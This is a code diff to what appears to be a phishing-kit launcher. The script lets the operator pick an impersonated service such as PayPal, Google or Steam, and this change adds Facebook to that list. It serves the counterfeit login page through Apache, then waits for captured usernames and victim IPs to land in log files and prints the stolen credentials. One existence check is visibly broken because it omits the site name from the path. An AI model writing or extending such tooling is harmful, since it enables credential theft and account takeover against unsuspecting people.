@@ -25,12 +25,13 @@ sites = {
     "20": "wordpress",
     "21": "yahoo",
     "22": "steam",
+    "23": "facebook"
 }
 
 print("Website options:")
 print("[1]  Adobe               [11] Netflix            [21] Yahoo")
 print("[2]  Badoo               [12] PayPal             [22] Steam")
-print("[3]  DevianArt           [13] Pinterest")
+print("[3]  DevianArt           [13] Pinterest          [23] Facebook")
 print("[4]  Google              [14] Shopify")
 print("[5]  Instafollowers      [15] Spotify")
 print("[6]  Instagram           [16] Twitch")
@@ -43,13 +44,17 @@ web_num = input("\nPlease enter a number: ")
 website = sites[web_num]
 
 # Remove log files if they have been previously saved
-if os.path.exists("/phish/sites/{}/ip.txt".format(website)):
-    print("Removing old ip.txt file...")
-    os.remove("/phish/sites/{}/ip.txt".format(website))
-
 if os.path.exists("/phish/sites/{}/usernames.txt"):
     print("Removing old usernames.txt file...")
-    os.remove("/phish/sites/{}/usernames.txt".format(website))
+    path = "/phish/sites/{}/usernames.txt".format(website)
+    os.remove(path)
+    time.sleep(0.5)
+
+if os.path.exists("/phish/sites/{}/ip.txt".format(website)):
+    print("Removing old ip.txt file...")
+    path = "/phish/sites/{}/ip.txt".format(website)
+    os.remove(path)
+    time.sleep(0.5)
 
 print("\n")
 print("Setting up DocumentRoot for apache...")
@@ -82,3 +87,4 @@ while 1:
         creds = open("/phish/sites/{}/usernames.txt".format(website)).read()
         print(creds)
         break
+    time.sleep(1)
